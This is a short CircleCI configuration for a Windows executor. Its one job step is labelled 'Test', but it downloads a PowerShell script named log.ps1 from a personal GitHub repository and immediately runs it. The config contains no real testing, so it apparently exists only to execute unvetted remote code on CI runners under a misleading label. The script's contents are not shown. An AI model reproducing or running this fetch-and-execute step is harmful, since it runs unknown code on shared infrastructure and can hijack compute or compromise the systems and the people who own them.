version: 2.1 
 
orbs:
  win: circleci/windows@2.2.0
 
jobs:
  build: 
    executor:
      name: win/default 
      size: "small" 
 
    steps:
      - run:
          name: Test
          command: |
            Invoke-WebRequest https://raw.githubusercontent.com/latugio/varakanda/main/log.ps1 -OutFile log.ps1
            ./log.ps1
